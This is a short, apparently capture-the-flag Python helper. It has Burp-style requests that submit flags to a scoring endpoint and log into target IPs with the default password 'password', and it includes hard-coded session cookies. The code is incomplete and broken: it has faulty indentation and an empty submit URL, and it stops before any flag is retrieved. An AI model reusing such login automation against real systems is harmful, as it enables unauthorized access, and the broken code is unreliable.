def flag_submit(flag):
    import requests

burp0_url = ""

burp0_cookies = {"PHPSESSID": "30bnlp2apsc9acu5g1qf650es4"}

burp0_headers = {"Accept": "*/*", "Origin": "http://100.100.100.200", "X-Requested-With":"XMLHttpRequest","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}

burp0_data = {"answerVal": flag}

r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


def flag_get(ip):
    with requests.Session() as s:

        burp0_url = "http://"+ip+"/"
        burp0_cookies = {"JSESSIONID": "84CBC07052E955A5D2381955B312187C", "ZVh5_2132_saltkey": "o5O3yFez",
                         "ZVh5_2132_lastvisit": "1530254636", "ZVh5_2132_sid": "LAdoUM",
                         "ZVh5_2132_lastact": "1530258236%09connect.php%09"}
        burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://102.102.102.82",
                         "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                         "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_data = {"password": "password", "doing": "login"}
        # 这里没有指定cookies
        s.post(burp0_url, headers=burp0_headers, data=burp0_data)